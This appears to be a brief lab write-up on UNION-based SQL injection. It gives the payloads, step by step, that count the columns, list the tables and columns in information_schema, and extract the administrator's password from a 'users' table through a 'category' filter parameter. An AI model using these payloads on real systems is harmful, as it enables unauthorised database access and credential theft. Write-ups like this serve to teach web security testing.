#### First figure out the no. of columns available to us
```
/filter?category=Gifts'+UNION+SELECT+null--            #Error response
/filter?category=Gifts'+UNION+SELECT+null,null--       #200 OK
/filter?category=Gifts'+UNION+SELECT+null,null,null--  #Error response
```


#### Then lets print out all the available table names in information_schema
```
/filter?category=Gifts' union select table_name,null from information_schema.tables--  #url encode it if necessary
```


#### From the above query we see that there is a table called `users`. Now, lets figure out what columns it contains.
```
/filter?category=Gifts' union select column_name,null from information_schema.columns where table_name='users'--
```


#### We see two columns `username` and `password` in the users table. So lets get the password of the `administrator` user.
```
/filter?category=Gifts' union select password,null from users where username='administrator'--
```
